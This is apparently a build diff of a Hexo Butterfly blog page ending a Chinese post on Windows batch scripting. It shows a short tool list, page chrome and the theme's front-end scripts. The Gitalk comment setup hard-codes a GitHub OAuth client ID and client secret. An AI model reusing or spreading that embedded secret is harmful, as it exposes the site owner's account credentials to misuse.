+<p>Tmos.exe-用鼠标操作命令行</p>
+<p>Image.exe-显示图片到命令行</p>
+<p>CAPI-批处理调用系统API,强大得不能再强大了<br>��了</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:1361151272@qq.com">shaozhy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://shaoshao.net.cn/2021/07/21/20210721135525000/">https://shaoshao.net.cn/2021/07/21/20210721135525000/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://shaoshao.net.cn" target="_blank">WineMonk</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/discover/tags/Windows/">Windows</a><a class="post-meta__tags" href="/discover/tags/Bat%E6%89%B9%E5%A4%84%E7%90%86/">Bat批处理</a></div><div class="post_share"><div class="social-share" data-image="https://shaoshao.net.cn/images/blog/cover/current/post_18.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://shaoshao.net.cn/images/blog/cover/payqr/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="https://shaoshao.net.cn/images/blog/cover/payqr/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://shaoshao.net.cn/images/blog/cover/payqr/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="https://shaoshao.net.cn/images/blog/cover/payqr/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/07/23/20210723101202000/"><img class="prev-cover" src="https://shaoshao.net.cn/images/blog/cover/current/post_19.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">编程实现修改Windows指定文件夹图标</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/14/20210714151710000/"><img class="next-cover" src="https://shaoshao.net.cn/images/blog/cover/current/post_17.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Winform窗体自动隐形插件</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/21/20220121174152000/" title="Bat批处理判断字符串包含与替换"><img class="cover" src="https://shaoshao.net.cn/images/blog/cover/current/post_13.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-21</div><div class="title">Bat批处理判断字符串包含与替换</div></div></a></div><div><a href="/2021/07/23/20210723101202000/" title="编程实现修改Windows指定文件夹图标"><img class="cover" src="https://shaoshao.net.cn/images/blog/cover/current/post_19.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-23</div><div class="title">编程实现修改Windows指定文件夹图标</div></div></a></div><div><a href="/2022/02/17/20220217140412000/" title="Cmd命令"><img class="cover" src="https://shaoshao.net.cn/images/blog/cover/current/post_18.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-17</div><div class="title">Cmd命令</div></div></a></div><div><a href="/2022/02/28/20220228190354000/" title="Windows系统配置脚本开机启动的3种方法"><img class="cover" src="https://shaoshao.net.cn/images/blog/cover/current/post_20.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-28</div><div class="title">Windows系统配置脚本开机启动的3种方法</div></div></a></div><div><a href="/2023/03/31/20230331135156000/" title="Windows访问网络共享失败解决办法"><img class="cover" src="https://shaoshao.net.cn/images/blog/cover/current/post_07.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-31</div><div class="title">Windows访问网络共享失败解决办法</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E5%A4%84%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">批处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E5%A4%84%E7%90%86-1"><span class="toc-number">2.</span> <span class="toc-text">批处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">变量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.1.</span> <span class="toc-text">变量的类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E7%9A%84%E5%91%BD%E5%90%8D"><span class="toc-number">4.2.</span> <span class="toc-text">变量的命名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E7%9A%84%E6%89%A9%E5%B1%95"><span class="toc-number">4.3.</span> <span class="toc-text">变量的扩展</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">6.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="toc-number">7.</span> <span class="toc-text">命令返回值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="toc-number">8.</span> <span class="toc-text">特殊符号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8A%80%E5%B7%A7"><span class="toc-number">9.</span> <span class="toc-text">文件技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E7%AB%A0%E7%BB%93%E6%9E%84"><span class="toc-number">9.1.</span> <span class="toc-text">文章结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%B8%AE%E5%8A%A9"><span class="toc-number">9.2.</span> <span class="toc-text">命令帮助</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">9.3.</span> <span class="toc-text">环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7-1"><span class="toc-number">9.4.</span> <span class="toc-text">特殊符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6"><span class="toc-number">9.5.</span> <span class="toc-text">处理文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E5%8F%A5%E7%BB%93%E6%9E%84"><span class="toc-number">10.</span> <span class="toc-text">语句结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">11.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">12.</span> <span class="toc-text">其他</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://shaoshao.net.cn/images/blog/cover/current/post_18.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By shaozhy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index"><img class="icp-icon" src="/img/icp.png"><span>冀ICP备20003018号-2</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function addGitalkSource () {
+  const ele = document.createElement('link')
+  ele.rel = 'stylesheet'
+  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
+  document.getElementsByTagName('head')[0].appendChild(ele)
+}
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: 'd990e8cbbd1dabc9c98e',
+      clientSecret: '59676d5926f4df676ec1ba6b36395bf90a0aeb54',
+      repo: 'WineMonk.github.io',
+      owner: 'WineMonk',
+      admin: ['WineMonk'],
+      id: 'd348e7a832a79a753c30b998cccb630d',
+      updateCountCallback: commentCount
+    },{"proxy":"https://vercel.prohibitorum.top/github_access_token"}))
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+    gitalk.render('gitalk-container')
+  }
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    addGitalkSource()
+    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.innerHTML= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !false) {
+  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="茶飘香,酒罢去,聚朋友,再回楼" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
